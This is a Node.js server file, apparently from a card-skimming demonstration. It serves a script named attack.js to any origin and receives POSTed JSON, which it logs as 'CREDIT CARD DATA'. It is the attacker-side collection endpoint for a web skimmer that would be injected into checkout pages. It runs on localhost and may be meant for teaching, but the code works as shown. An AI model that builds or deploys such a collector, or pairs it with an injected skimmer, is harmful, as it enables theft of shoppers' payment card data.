const http = require("http");
const fs = require("fs/promises");

const PORT = 3000;

function getRequestBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";

    req.on("data", (chunk) => {
      body += chunk.toString();
    });

    req.on("end", () => {
      resolve(body);
    });

    req.on("error", (err) => {
      reject(err);
    });
  });
}

const server = http.createServer(async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");

  if (req.method === "GET") {
    if (req.url === "/script") {
      const js = await fs.readFile("./attack.js", {
        encoding: "utf-8",
      });
      res.writeHead(200, { "content-type": "text/javascript" });
      res.end(js);
      return;
    }

    if (req.url === "/api/data") {
      console.log("GET /api/data");
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(
        JSON.stringify({
          message: "Test succeeded!",
        }),
      );
      return;
    }
  }

  if (req.method === "POST") {
    if (req.url === "/api/data") {
      console.log("POST /api/data");
      const reqBody = await getRequestBody(req);
      const parsedBody = JSON.parse(reqBody);
      console.log("CREDIT CARD DATA", parsedBody);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end();
      return;
    }
  }

  res.writeHead(404, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ error: "Route not found" }));
});

server.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}/`);
});
